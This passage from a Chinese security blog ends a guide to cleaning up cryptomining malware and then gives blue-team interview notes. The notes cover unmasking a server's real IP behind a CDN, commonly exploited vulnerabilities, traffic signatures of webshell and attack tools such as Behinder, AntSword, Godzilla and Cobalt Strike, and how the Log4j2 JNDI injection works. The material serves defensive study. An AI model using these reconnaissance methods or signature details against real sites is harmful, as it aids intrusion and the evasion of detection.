CMS 的远程命令执行漏洞</li><li>新爆的高危漏洞：一般每次爆发新的高危漏洞，都会紧跟一波大规模的全网扫描利用和挖矿</li></ol><h1 id="清除挖矿木马（入侵排查过程）"><a href="#清除挖矿木马（入侵排查过程）" class="headerlink" title="清除挖矿木马（入侵排查过程）"></a>清除挖矿木马（入侵排查过程）</h1><h2 id="及时隔离主机"><a href="#及时隔离主机" class="headerlink" title="及时隔离主机"></a>及时隔离主机</h2><p>部分带有蠕虫功能的挖矿木马在取得本机的控制权后，会以本机为跳板机，对同一局域网内的其他主机进行已知漏洞的扫描和进一步利用， 所以发现挖矿现象后，在不影响业务的前提下应该及时隔离受感染主机，然后进行下一步分析</p><h2 id="删除文件、阻断与矿池通讯"><a href="#删除文件、阻断与矿池通讯" class="headerlink" title="删除文件、阻断与矿池通讯"></a>删除文件、阻断与矿池通讯</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行以下命令查看挖矿进程的执行文件链接</span></span><br><span class="line">ls -l /proc/xxx/exe          # xxx表示该进程的PID。</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行以下命令查看是否存在业务范围之外的可疑通信地址和开放端口</span></span><br><span class="line">iptables -L -n</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行以下命令清除恶意矿池地址</span></span><br><span class="line">vi /etc/sysconfig/iptables</span><br></pre></td></tr></table></figure><h2 id="清除定时任务"><a href="#清除定时任务" class="headerlink" title="清除定时任务"></a>清除定时任务</h2><p>大部分挖矿进程会在受感染主机中写入定时任务来完成程序的驻留，当安全人员只清除挖矿木马时，定时任务会再次从服务器下载挖矿进程或者直接执行挖矿脚本，导致挖矿进程清除失败</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">crontab -l </span><br><span class="line">crontab -r</span><br></pre></td></tr></table></figure><h2 id="清除启动项"><a href="#清除启动项" class="headerlink" title="清除启动项"></a>清除启动项</h2><p>有的挖矿进程为了实现长期驻留，会向系统中添加启动项来确保系统重启后挖矿进程还能重新启动，所以在清除时还应该关注启动项中的内容如果有可疑的启动项，也应该进行排查，确认是挖矿进程后，对其进行清除</p><h2 id="kill-挖矿进程"><a href="#kill-挖矿进程" class="headerlink" title="kill 挖矿进程"></a>kill 挖矿进程</h2><p>对于单进程挖矿程序，直接结束挖矿进程即可。但是对于大多数的挖矿进程，如果挖矿进程有守护进程，应先杀死守护进程再杀死挖矿进程，避免清除不彻底 在实际的清除工作中，应找到本机上运行的挖矿脚本，根据脚本的执行流程确定木马的驻留方式， 并按照顺序进行清除， 避免清除不彻底</p><h2 id="清除公钥文件"><a href="#清除公钥文件" class="headerlink" title="清除公钥文件"></a>清除公钥文件</h2><p>在用户 home 目录的 .ssh 目录下放置 authoruzed_keys 文件，从而免密登录该机器也是一种常见的保持服务器控制权的手段。在排查过程中应该查看该文件中是否有可疑公钥信息，有的话直接删除，避免攻击者再次免密登录该主机</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat .ssh/authorized_keys</span><br></pre></td></tr></table></figure><h1 id="Windows系统清除木马"><a href="#Windows系统清除木马" class="headerlink" title="Windows系统清除木马"></a>Windows系统清除木马</h1><ol><li><p>通过CPU占用情况排查可疑的挖矿进程。</p></li><li><p>执行以下命令，查看挖矿进程的磁盘文件、进程启动命令的参数。</p></li></ol><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wmic <span class="keyword">process</span> <span class="built_in">where</span> processid=xxx get processid,executablepath,commandline,name     <span class="comment">#xxx表进程pid</span></span><br></pre></td></tr></table></figure><ol start="3"><li><p>结束挖矿进程，清除挖矿文件。</p></li><li><p>执行以下命令，检查主机连接的可疑网络端口。</p></li></ol><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">netstat <span class="literal">-ano</span> | findstr xxx            <span class="comment"># xxx 表可疑的网络端口</span></span><br></pre></td></tr></table></figure><ol start="5"><li>执行以下命令，检查服务器中hosts文件是否存在挖矿程序的矿池地址。</li></ol><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span>  C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><ol start="6"><li>执行以下命令，排查是否存在挖矿程序设定的计划任务。</li></ol><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">schtasks /query</span><br></pre></td></tr></table></figure><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><p><a href="https://zhuanlan.zhihu.com/p/139019250">如何应对挖矿病毒</a></p></li><li><p><a href=""><strong>一键清除！网御星云解锁挖矿病毒防护与处置“新技能”</strong></a></p></li><li><p>[**挖矿程序处理最佳实践**](<a href="https://help.aliyun.com/document_detail/161236.html#:~:text=%E9%9D%9E%E4%BA%91%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83%E7%94%A8%E6%88%B7%E5%A4%84%E7%90%86%E6%8C%96%E7%9F%BF%E7%A8%8B%E5%BA%8F%EF%BC%88Windows%E7%B3%BB%E7%BB%9F%EF%BC%89">https://help.aliyun.com/document_detail/161236.html#:~:text=非云安全中心用户处理挖矿程序（Windows系统）</a> 1 执行以下命令，通过CPU占用情况排查可疑的挖矿进程。… 2 执行以下命令，查看挖矿进程的磁盘文件、进程启动命令的参数。… 3 结束挖矿进程，清除挖矿文件。,4 执行以下命令，检查主机连接的可疑网络端口。… 5 执行以下命令，检查服务器中hosts文件是否存在挖矿程序的矿 … 6 执行以下命令，排查是否存在挖矿程序设定的计划任务。)</p></li><li><p><a href="https://github.com/Lorna-Dane/Blue-Team">一些个人学习的蓝队知识以及取证笔记</a></p></li><li><p><a href="https://github.com/Bypass007/Emergency-Response-Notes">应急响应实战笔记，一个安全工程师的自我修养</a></p></li><li><p><a href="https://bypass007.github.io/Emergency-Response-Notes/">应急响应实战笔记</a></p></li><li><p><a href="https://www.mubucm.com/doc/8aGBgK_MVg">Linux入侵排查</a></p></li><li><p><a href="https://www.mubucm.com/doc/GtiDRd0nVg">Windows入侵排查</a></p></li><li><p><a href="http://wlaq.xjtu.edu.cn/info/1008/1945.htm">挖矿病毒处置（Linux篇) ——从入门到放弃</a></p></li><li><p><a href="http://les1ie.com/2021/07/12/tor-miner/">又一起挖矿木马排查</a></p></li><li><p><a href="https://www.anquanke.com/post/id/92223">利用WebLogic漏洞挖矿事件分析</a></p></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hw面试题</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%A2%E8%AF%95+%E7%AC%94%E8%AF%95/hw%E9%9D%A2%E8%AF%95%E9%A2%98.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%A2%E8%AF%95+%E7%AC%94%E8%AF%95/hw%E9%9D%A2%E8%AF%95%E9%A2%98.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>护网或者重保面试题</p><h1 id="基础问题"><a href="#基础问题" class="headerlink" title="基础问题"></a>基础问题</h1><h3 id="如何判断一个网站（挂了CDN）的真实ip地址"><a href="#如何判断一个网站（挂了CDN）的真实ip地址" class="headerlink" title="如何判断一个网站（挂了CDN）的真实ip地址"></a>如何判断一个网站（挂了CDN）的真实ip地址</h3><blockquote><blockquote><p>要注意 判断CDN和绕过CDN是不一样的，但是实际上，绕过的过程已经在过程中判断出是否挂了CDN。怎么说呢，最常用的判断方法应该是多地ping和国外访问（本质上差不多好吧~</p></blockquote><ol><li>多地ping</li></ol><blockquote><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a> </p><p><a href="https://www.17ce.com/">https://www.17ce.com/</a></p><p><a href="http://www.webkaka.com/Ping.aspx">http://www.webkaka.com/Ping.aspx</a></p><p><a href="https://tools.ipip.net/newping.php">https://tools.ipip.net/newping.php</a></p><p>用各种多地 ping 的服务，查看对应 IP 地址是否唯一</p><p>黑客也可以从多个地点ping他们想要确认的域名，若返回的是不同的 ip，那么服务器确定使用了 cdn，返回的 ip 也不是服务器的真实 ip</p></blockquote><ol start="2"><li>nslookup查找法</li></ol><blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup gungnir.top</span><br><span class="line">nslookup www.qq.com</span><br></pre></td></tr></table></figure><p>使用 nslookup 命令进行查询，若返回域名解析结果为多个 ip，多半使用了 CDN，是不真实的 ip。</p><p>nslookup怎么用，参考之前的文章：[nslookup 使用](</p></blockquote></blockquote><h3 id="如何绕过CDN呢"><a href="#如何绕过CDN呢" class="headerlink" title="如何绕过CDN呢"></a>如何绕过CDN呢</h3><p>有些攻击者喜欢用 cdn 隐藏流量，我们可以使用一些网上的工具比如说 dnsinfo 啊，dnsdumpster 这些，那么我们便要绕过CDN拿到真是IP才行</p><blockquote><ol><li>查询子域名的IP</li></ol><blockquote><p><a href="https://ip.tool.chinaz.com/ipbatch">https://ip.tool.chinaz.com/ipbatch</a><br>CDN 流量收费高，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP</p><p>因为 cdn 和反向代理是需要成本的，有的网站只在比较常用的域名使用 cdn 或反向代理，有的时候一些测试子域名和新的子域名都没来得及加入 cdn 和反向代理，所以有时候是通过查找子域名来查找网站的真实 IP</p><p>查询子域名的方法就很多了：subDomainsBrute、Sublist3r、Google hack 等。</p></blockquote><ol start="2"><li>MX记录邮件服务&#x2F;网站订阅邮件法</li></ol><blockquote><p>邮件服务查询的原理主要在于：<strong>我们访问别人，可能通过 CND，但别人访问我们通常不会走 CDN</strong></p></blockquote><blockquote><ul><li>MX记录是一种常见的查找IP的方式。如果网站在与web相同的服务器和IP上托管自己的邮件服务器，那么原始服务器IP将在MX记录中。</li><li>黑客可以通过网站订阅邮件的功能，让网站给自己发邮件，查看邮件的源代码即可获取网站真实 ip</li></ul></blockquote><ol start="3"><li>查询历史DNS记录</li></ol><blockquote><p><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a><br><a href="https://securitytrails.com/">https://securitytrails.com/</a><br><a href="https://viewdns.info/iphistory/">https://viewdns.info/iphistory/</a><br><a href="https://www.ip138.com/">https://www.ip138.com/</a><br><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br><a href="http://toolbar.netcraft.com/site_report?url=">http://toolbar.netcraft.com/site_report?url=</a><br><a href="http://viewdns.info/">http://viewdns.info/</a><br><a href="http://www.17ce.com/">http://www.17ce.com/</a><br><a href="https://community.riskiq.com/">https://community.riskiq.com/</a><br><a href="http://www.crimeflare.com/cfssl.html">http://www.crimeflare.com/cfssl.html</a></p><p>查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录;</p><p>有的网站是后来才加入 CDN 的，所以只需查询它的解析历史即可获取真实 ip</p></blockquote><ol start="4"><li>国外访问</li></ol><blockquote><p><a href="https://asm.ca.com/en/ping.php">https://asm.ca.com/en/ping.php</a><br>因为有些网站设置CDN可能没有把国外的访问包含进去，所以可以这么绕过。国外没有 cdn 节点的话，可能直接走原 ip</p></blockquote><ol start="5"><li>以量打量</li></ol><blockquote><p>CDN 节点是有流量上限的，用光之后就会直通原机，这也是一种流量攻击</p></blockquote><ol start="6"><li>利用网站漏洞</li></ol><blockquote><p>如果目标站点存在漏洞，这就没办法避免了。例如 phpinfo 敏感信息泄露、 phpinfo 泄露、github 信息泄露、命令执行等漏洞、Apache status 和 Jboss status 敏感信息泄露、网页源代码泄露、svn 信息泄露信、github 信息泄露等。</p><p>若存在 web 漏洞，服务器主动与我们发起请求连接，我们也能获取目标站点真实 ip。例如 xss、ssrf、命令执行反弹 shell 等</p></blockquote><ol start="7"><li>也可以根据 XFF 头，referer 头来判断</li><li>抓取图标 icon 的 hash，然后在网络空间搜索引擎中去 search</li></ol><blockquote><p><a href="https://blog.csdn.net/Aaron_Miller/article/details/117532626">如果访问有 icon 的话，可以抓hash 去匹配</a>。shodan，x 情报社区，钟馗之眼，fofa，夸克，google 语法这些就可以用一用了。</p></blockquote><blockquote><p><a href="https://fofa.so/">网络空间测绘搜索引擎FOFA</a> 和 <a href="https://www.shodan.io/">物联网暗黑搜索引擎Shodan</a>可以通过网站的icon计算出一个用来搜索目标的<a href="https://so.csdn.net/so/search?q=hash&spm=1001.2101.3001.7020">hash</a>值：iconhash，信息收集过程中我们也可以通过iconhash去反差使用此icon的所有站点。</p></blockquote><ol start="9"><li>Zmap大法</li></ol><blockquote><p>据说扫描全网，只要44分钟？主要是注意查找遗留文件，从中拿到有价值的东西</p><p>可参考这篇文章：<a href="https://link.zhihu.com/?target=http://bobao.360.cn/learning/detail/211.html">简单获取CDN背后网站的真实IP - 安全客 - 有思想的安全新媒体</a></p></blockquote><ol start="10"><li>网络空间引擎搜索法</li></ol><blockquote><p>zoomeye、fofa、shodan</p><p>通过这些公开的安全搜索引擎爬取得历史快照，主要得一些特征总结如下：</p><p>特有的http头部（如server类型、版本、cookie等信息)、</p><p>特定keyword（如title、css、js、url等）、</p><p>特定的IP段搜索（如fofa支持C段搜索），</p><p>有些时候爬取的时候不一定含有上面那些特征，但是我们仍然需要仔细排查。</p></blockquote><ol start="11"><li>查询Https证书</li></ol></blockquote><h3 id="如何⼿⼯快速判断⽬标站是-windows-还是-linux-服务器？"><a href="#如何⼿⼯快速判断⽬标站是-windows-还是-linux-服务器？" class="headerlink" title="如何⼿⼯快速判断⽬标站是   windows   还是   linux   服务器？"></a>如何⼿⼯快速判断⽬标站是   windows   还是   linux   服务器？</h3><blockquote><p>1、linux大小写敏感,windows大小写不敏感。—–已经测试证实</p><p>2、ping服务器，返还得TTL值不一样，windows一般在100以上，linux一般是100一下。—已经测试证实通过测试</p><blockquote><p>ping linux内网机器的ttl为64</p><p>ping window内网机器的ttl为126</p></blockquote><p>3、推理及应用，测试百度的机器是linux还是windows的</p></blockquote><h3 id="你知道红队经常用于攻击的漏洞是什么吗？"><a href="#你知道红队经常用于攻击的漏洞是什么吗？" class="headerlink" title="你知道红队经常用于攻击的漏洞是什么吗？"></a>你知道红队经常用于攻击的漏洞是什么吗？</h3><blockquote><ul><li>shiro-550 漏洞，由于 shiro 框架中用于加密 cookie 的密钥是硬编码的，攻击者可以伪造合法 cookie 传入服务器后端，进而造成 java 反序列化漏洞</li><li>fastjson 反序列化漏洞，fastjson 在解析 json 的过程中，支持使用autoType 来实例化某一个具体的类，并调用该类的 set&#x2F;get 方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。进而造成 rce</li><li>弱口令漏洞</li><li>struts2 漏洞</li><li>thinkphp 框架漏洞</li><li>log4j2</li></ul></blockquote><h3 id="介绍⼀下⾃认为有趣的挖洞经历"><a href="#介绍⼀下⾃认为有趣的挖洞经历" class="headerlink" title="介绍⼀下⾃认为有趣的挖洞经历"></a>介绍⼀下⾃认为有趣的挖洞经历</h3><blockquote></blockquote><h3 id="你平时⽤的⽐较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复⽅案？"><a href="#你平时⽤的⽐较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复⽅案？" class="headerlink" title="你平时⽤的⽐较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复⽅案？"></a>你平时⽤的⽐较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复⽅案？</h3><blockquote></blockquote><h1 id="流量特征"><a href="#流量特征" class="headerlink" title="流量特征"></a>流量特征</h1><h2 id="冰蝎流量特征"><a href="#冰蝎流量特征" class="headerlink" title="冰蝎流量特征"></a>冰蝎流量特征</h2><blockquote><ul><li><a href="https://zhuanlan.zhihu.com/p/135227454#:~:text=%E7%94%B1%E4%BA%8E%E9%80%9A%E4%BF%A1%E6%B5%81%E9%87%8F%E8%A2%AB%E5%8A%A0%E5%AF%86%EF%BC%8C%E4%BC%A0%E7%BB%9F%E7%9A%84%20WAF%E3%80%81IDS,%E8%AE%BE%E5%A4%87%E9%9A%BE%E4%BB%A5%E6%A3%80%E6%B5%8B%EF%BC%8C%E7%BB%99%E5%A8%81%E8%83%81%E7%8B%A9%E7%8C%8E%E5%B8%A6%E6%9D%A5%E8%BE%83%E5%A4%A7%E6%8C%91%E6%88%98%E3%80%82%20%E5%86%B0%E8%9D%8E%E5%85%B6%E6%9C%80%E5%A4%A7%E7%89%B9%E7%82%B9%E5%B0%B1%E6%98%AF%E5%AF%B9%E4%BA%A4%E4%BA%92%E6%B5%81%E9%87%8F%E8%BF%9B%E8%A1%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%EF%BC%8C%E4%B8%94%E5%8A%A0%E5%AF%86%E7%A7%98%E9%92%A5%E6%98%AF%E7%94%B1%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%87%BD%E6%95%B0%E5%8A%A8%E6%80%81%E7%94%9F%E6%88%90%EF%BC%8C%E5%9B%A0%E6%AD%A4%E8%AF%A5%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E6%B5%81%E9%87%8F%E5%87%A0%E4%B9%8E%E6%97%A0%E6%B3%95%E6%A3%80%E6%B5%8B%E3%80%82">冰蝎-特征检测及报文解密</a></li><li><a href="https://www.freebuf.com/articles/247009.html">冰蝎3.0流量特征分析（附特征）</a></li><li><a href="https://www.freebuf.com/articles/web/324622.html">常见webshell工具及特征分析</a></li></ul></blockquote><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>冰蝎特点：<strong>AES对称加密、</strong>动态二进制网站管理客户端，配合服务端 shell 的动态二进制加密通信，适用于 waf 拦截的回显。冰蝎其最大特点就是对交互流量进行对称加密，加密后还会进行 base64 编码。且加密秘钥是由随机数函数动态生成，因此该客户端的流量几乎无法检测</p><ul><li><p>冰蝎的通信过程可以分为两个阶段：</p><blockquote><ol><li>密钥协商</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209231500459.jpeg" alt="img" style="zoom:33%;" /><ol><li>加密传输</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209231501826.jpeg" alt="img" style="zoom:33%;" /></blockquote></li></ul><h3 id="流量特征："><a href="#流量特征：" class="headerlink" title="流量特征："></a>流量特征：</h3><ul><li><p>冰蝎在连接之前（也就是在密钥协商阶段）会发送一个GET请求，服务端如果正常会响应一个16位的字符串(密钥），小写字母+数字组成。密钥存在于Response Body中。</p></li><li><p>请求中content-length 请求长度，对于上传文件，命令执行来讲，加密的参数不定长。但是对于密钥交互，获取基本信息来讲，<strong>payload都为定长</strong>（这个不一定准确）。一般为5740或5720（可能会根据Java版本而改变）</p></li><li><p>每一个请求头中存在Pragma: no-cache，Cache-Control: no-cache</p></li><li><p>冰蝎3.0：一般冰蝎的流量包会伴随着大量的 <code>content-type:application/octet-stream</code></p></li></ul><blockquote><ul><li><strong>application&#x2F;octet-stream</strong>：</li></ul><p>只能提交二进制，而且只能提交一个二进制，如果提交文件的话，只能提交一个文件,后台接收参数只能有一个，而且只能是流（或者字节数组）；</p><p>属于HTTP规范中Content-Type的一种；</p><p>很少使用。</p></blockquote><ul><li>Accept字段(可被绕过)</li></ul><p>Accept是HTTP协议常用的字段，但冰蝎默认 Accept 字段的值却很特殊，这个特征存在于冰蝎的任何一个通讯阶段。如下：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Accept: text/html,image/gif, image/jpeg, *; q=.2, */*; q=.2</span><br><span class="line">3.0：</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209231502053.jpeg" alt="img" style="zoom:33%;" /><ul><li>UserAgent字段（可绕过）</li></ul><p>冰蝎3.0：默认内置十六个 ua 头。每次连接 shell 会随机选择一个进行使用。如果发现历史流量中同一个源IP访问某个URL时，命中了以下列表中多个 UserAgent ，可基本确认为冰蝎特征。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.163 Safari/535.1</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50</span><br><span class="line">Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.9.168 Version/11.50</span><br><span class="line">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; Tablet PC 2.0; .NET4.0E)</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3)</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.0)</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</span><br><span class="line">Mozilla/5.0 (Windows; U; Windows NT 6.1; ) AppleWebKit/534.12 (KHTML, like Gecko) Maxthon/3.0 Safari/534.12</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E; SE 2.X MetaSr 1.0)</span><br><span class="line">Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.472.33 Safari/534.3 SE 2.X MetaSr 1.0</span><br><span class="line">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1 QQBrowser/6.9.11079.201</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E) QQBrowser/6.9.11079.201</span><br><span class="line">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)</span><br></pre></td></tr></table></figure><h2 id="菜刀流量特征"><a href="#菜刀流量特征" class="headerlink" title="菜刀流量特征"></a>菜刀流量特征</h2><p>(最开始是明文传输，后来采用base64加密)：PHP类WebShell连接流量</p><ul><li>菜刀 webshell 只使用了 url 编码 + base64 编码，所以会有(base64_decode($_POST[z0]))，(base64_decode($_POST[z0]))将攻击payload进行Base64解码，注意观察<strong>base64_decode字段</strong></li><li>shell 特征就是传输参数名为 z0(&amp;z0&#x3D;QGluaV9zZXQ)</li></ul><blockquote><p>该部分是传递攻击payload，此参数z0对应$_POST[z0]接收到的数据，该参数值是使用Base64编码的，所以可以利用base64解码可以看到攻击明文。</p></blockquote><ul><li>2016 后的版本做了加密和混淆，有些关键函数还是没有被加密的，比如 ini_set，eval，assert等。</li><li>菜刀的$_POST 也可能会被$_GET 和$_REQUEST 替代</li></ul><h2 id="蚁剑流量特征"><a href="#蚁剑流量特征" class="headerlink" title="蚁剑流量特征"></a>蚁剑流量特征</h2><ul><li>蚁剑对流量有<strong>base64加密</strong>，但是有些关键代码是没有被加密的，比如：PHP 中的 ini_set；ASP 中的 OnError,response。</li><li>流量最中<strong>明显的特征</strong>为@ini_set(“display_errors”,”0”);这段代码基本是所有WebShell客户端链接PHP类WebShell都有的一种代码</li><li>由于蚁剑中包含了很多加密、绕过插件，所以导致很多流量被加密后无法识别，但是蚁剑混淆加密后还有一个比较明显的特征，即为参数名大多以“<em>0x…..&#x3D;”这种形式（下划线可替换为其他）所以，以</em><strong>0x开头的参数名</strong>，后面为加密数据的数据包也可识别为蚁剑的流量特征。</li><li>会带有base64编码解码等字符特征</li></ul><h2 id="哥斯拉流量特征（base64加密）"><a href="#哥斯拉流量特征（base64加密）" class="headerlink" title="哥斯拉流量特征（base64加密）"></a>哥斯拉流量特征（base64加密）</h2><p>哥斯拉的流量隐藏就做得很好了，据说能绕过市面上基本所有的静态查杀。</p><blockquote><ul><li>所有请求中Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8</li><li>所有响应中Cache-Control: no-store, no-cache, must-revalidate,</li></ul><p>以上两个只能作为弱特征参考</p><ul><li>同时在所有请求中Cookie中后面都存在<strong>；</strong>特征</li><li>与php请求一样都含有”pass&#x3D;”而且发起连接时服务器返回的Content-Length是0</li></ul></blockquote><blockquote><p><a href="https://blog.csdn.net/weixin_46684578/article/details/122148960">哥斯拉流量特征已经检测思路</a></p></blockquote><h2 id="cobalt-strick流量特征"><a href="#cobalt-strick流量特征" class="headerlink" title="cobalt strick流量特征"></a>cobalt strick流量特征</h2><p>cs 的流量特征有很多，比如说一些可以变更端口，<strong>默认证书-指纹信息（ssl.store）</strong>。还有一些比如说 <strong>shell whoami，hashdump，screenshot 没有被加密</strong>。CS 还有<strong>心跳包</strong>，有分析平台的话可以批量分析流量数据，或者批量导出然后用 excle 做一下透视</p><p>数据包的话可以观察 certificate 数据包，也可以看看连接节点时发送的 client hello 数据包。</p><p>还有一些可以作为辅助判断的，比如 Beacon Staging，也可以看看ja3 的值，cs 使用的是 ja3 的算法。</p><blockquote><p>(不怎么懂）太菜了</p></blockquote><h2 id="AWVS流量特征"><a href="#AWVS流量特征" class="headerlink" title="AWVS流量特征"></a>AWVS流量特征</h2><p>在护网中，通过Fofa检索title&#x3D;&#x3D;”Acunetix”可以看到有659个IP部署了AWVS，如果企业未在互联侧部署有AWVS，则可以将以上IP作为重点监控对象。使用AWVS扫描器对企业资产进行扫描时，HTTP请求包和响应包中都存在有特征。</p><p>（1）Accept:acunetix&#x2F;wvs</p><p>（2）HTTP请求头存在Acunetix-*的自定义字段</p><p>（3）HTTP请求包或者响应包中包含hit*.<a href="https://link.zhihu.com/?target=http://bxss.me">http://bxss.me</a></p><p>AWVS在进行无回显漏洞探测时候会使用到DNSLog（<a href="https://link.zhihu.com/?target=http://bxss.me">http://bxss.me</a>），DNSLog生成规则为”<a href="https://link.zhihu.com/?target=http://hit">http://hit</a>“ + rndToken + ‘.<a href="https://link.zhihu.com/?target=http://bxss.me/">http://bxss.me/</a>‘ 随机的三级域名作为payload。</p><h1 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h1><h2 id="Log4j2远程代码执行漏洞"><a href="#Log4j2远程代码执行漏洞" class="headerlink" title="Log4j2远程代码执行漏洞"></a>Log4j2远程代码执行漏洞</h2><blockquote><p><a href="https://11pmsleep.github.io/2022-09-22-WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/0x15-Apache%20Log4j2%E6%BC%8F%E6%B4%9E/">0x15 - Apache Log4j2 漏洞</a></p></blockquote><h3 id="漏洞概要-："><a href="#漏洞概要-：" class="headerlink" title="漏洞概要 ："></a><strong>漏洞概要 ：</strong></h3><p>Apache Log4j是一个基于Java的日志记录组件。</p><p>log4j2可以使用简单表达式记录动态内容,也就是可以传入变量，也就是<code>$&#123;&#125;</code></p><p>简单表达式使用 ${} 进行包裹变量，在 ${} 后面可以使用一些解析器，解析动态内容，打印出来解析的结果（本来我们看不到日志内容，但是可以通过dnslog带出执行结果）</p><p><strong>在这个${}里面存在着JNDI注入</strong></p><p><code>$&#123;&#125;</code>解析变量有多种方式多种解析器，log4j2漏洞便是因为jndi解析器。</p><p>主要是JNDI其中有一个lookup()方法，这是一个查找方法，log4j2在获取到${}这样的格式的时候会自动的去调用lookup()方法。</p><p>这个方法的可怕之处就在于，<strong>如果lookup方法的参数是一个url地址时，那么客户端就会去lookup()方法参数指定的url中加载远程对象</strong>。比如<code>lookup(&quot;rmi://127.0.0.1/test&quot;)</code></p><p>回过头来，jndi 解析器可以获取远程 jndi 对象。jdk中提供了多种不同 jndi 对象的获取方式，获取方式可以称为schema，注入rmi，ldap，dns</p><p>我们使用jndi利用ldap或者rmi的方式加载远程恶意类并执行即可达到我们getshell的目的</p><h3 id="log4j2流量特征"><a 